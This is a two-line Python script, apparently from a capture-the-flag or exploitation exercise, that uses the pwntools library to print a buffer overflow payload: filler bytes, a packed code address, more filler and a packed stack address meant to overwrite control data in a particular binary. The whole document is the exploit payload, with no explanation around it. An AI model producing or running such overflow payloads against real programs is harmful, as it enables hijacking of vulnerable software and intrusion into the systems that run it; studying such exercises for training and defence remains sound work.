from pwn import *
print "A"*8 + p64(0x000000000040063a) + "B" * 112 + p64(0x7fffffffd090)
